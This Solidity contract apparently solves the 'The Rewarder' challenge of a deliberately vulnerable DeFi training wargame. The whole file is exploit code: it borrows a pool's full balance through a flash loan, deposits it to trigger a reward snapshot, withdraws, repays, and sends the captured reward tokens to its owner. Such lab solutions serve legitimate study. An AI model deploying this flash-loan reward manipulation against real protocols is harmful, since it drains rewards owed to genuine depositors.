// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { FlashLoanerPool, DamnValuableToken } from "src/05-TheRewarder/FlashLoanerPool.sol";
import { TheRewarderPool, RewardToken } from "src/05-TheRewarder/TheRewarderPool.sol";

contract Attack {
    address internal _owner;
    FlashLoanerPool internal _flash;
    TheRewarderPool internal _pool;

    constructor(FlashLoanerPool flash, TheRewarderPool pool) {
        _owner = msg.sender;
        _flash = flash;
        _pool = pool;
    }

    function attack() external {
        FlashLoanerPool flash = _flash;
        flash.flashLoan(flash.liquidityToken().balanceOf(address(flash)));
    }

    function receiveFlashLoan(uint256 amount) external {
        TheRewarderPool pool = _pool;
        DamnValuableToken token = _flash.liquidityToken();
        token.approve(address(pool), type(uint256).max);
        pool.deposit(amount);
        pool.distributeRewards();
        pool.withdraw(amount);
        token.transfer(address(_flash), amount);
        RewardToken reward = pool.rewardToken();
        reward.transfer(_owner, reward.balanceOf(address(this)));
    }
}
